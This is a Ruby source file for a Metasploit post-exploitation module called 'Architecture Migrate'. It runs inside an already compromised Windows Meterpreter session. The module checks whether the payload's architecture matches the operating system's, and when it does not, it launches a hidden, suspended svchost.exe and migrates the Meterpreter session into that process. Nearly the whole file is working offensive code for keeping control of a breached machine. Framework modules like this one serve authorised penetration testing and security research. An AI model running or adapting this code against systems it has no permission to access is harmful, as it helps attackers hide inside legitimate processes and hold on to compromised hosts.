##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'Architecture Migrate',
      'Description' => %q(This module checks if the meterpreter architecture is the same as the OS architecture and if it's incompatible it spawns a
                          new process with the correct architecture and migrates into that process.),
      'License' => MSF_LICENSE,
      'Author' => ['Koen Riepe (koen.riepe@fox-it.com)'],
      'References' => [''],
      'Platform' => [ 'win' ],
      'Arch' => [ 'x86', 'x64' ],
      'SessionTypes' => [ 'meterpreter' ]
    )
    )

    register_options(
      [
        OptString.new('EXE', [true, 'The executable to start and migrate into', 'C:\windows\sysnative\svchost.exe']),
        OptBool.new('FALLBACK', [ true, 'If the selected migration executable does not exist fallback to a sysnative file', true ]),
        OptBool.new('IGNORE_SYSTEM', [true, 'Migrate even if you have SYSTEM privileges', false])
      ],
      self.class
    )
  end

  def check_32_on_64
    begin
      apicall = session.railgun.kernel32.IsWow64Process(-1, 4)["Wow64Process"]
      # railgun returns '\x00\x00\x00\x00' if the meterpreter process is 64bits.
      if apicall == "\x00\x00\x00\x00"
        migrate = false
      else
        migrate = true
      end
      return migrate
    rescue
      print_error('Railgun not available, this module only works for binary meterpreters.')
    end
  end

  def get_windows_loc
    apicall = session.railgun.kernel32.GetEnvironmentVariableA("Windir", 255, 255)["lpBuffer"]
    windir = apicall.split(":")[0]
    return windir
  end

  def do_migrate
    if check_32_on_64
      print_status('The meterpreter is not the same architecture as the OS! Upgrading!')
      newproc = datastore['EXE']
      if exist?(newproc)
        print_status("Starting new x64 process #{newproc}")
        pid = session.sys.process.execute(newproc, nil, { 'Hidden' => true, 'Suspended' => true }).pid
        print_good("Got pid #{pid}")
        print_status('Migrating..')
        session.core.migrate(pid)
        if pid == session.sys.process.getpid
          print_good('Success!')
        else
          print_error('Migration failed!')
        end
      else
        print_error('The selected executable to migrate into does not exist')
        if datastore['FALLBACK']
          windir = get_windows_loc
          newproc = "#{windir}:\\windows\\sysnative\\svchost.exe"
          if exist?(newproc)
            print_status("Starting new x64 process #{newproc}")
            pid = session.sys.process.execute(newproc, nil, { 'Hidden' => true, 'Suspended' => true }).pid
            print_good("Got pid #{pid}")
            print_status('Migrating..')
            session.core.migrate(pid)
            if pid == session.sys.process.getpid
              print_good('Success!')
            else
              print_error('Migration failed!')
            end
          end
        end
      end
    else
      print_good('The meterpreter is the same architecture as the OS!')
    end
  end

  def run
    if datastore['IGNORE_SYSTEM']
      do_migrate
    elsif !datastore['IGNORE_SYSTEM'] && is_system?
      print_error('You are running as SYSTEM! Aborting migration.')
    elsif datastore['IGNORE_SYSTEM'] && is_system?
      print_error('You are running as SYSTEM! You will lose your privileges!')
      do_migrate
    elsif !datastore['IGNORE_SYSTEM'] && !is_system?
      print_status('You\'re not running as SYSTEM. Moving on...')
      do_migrate
    end
  end
end
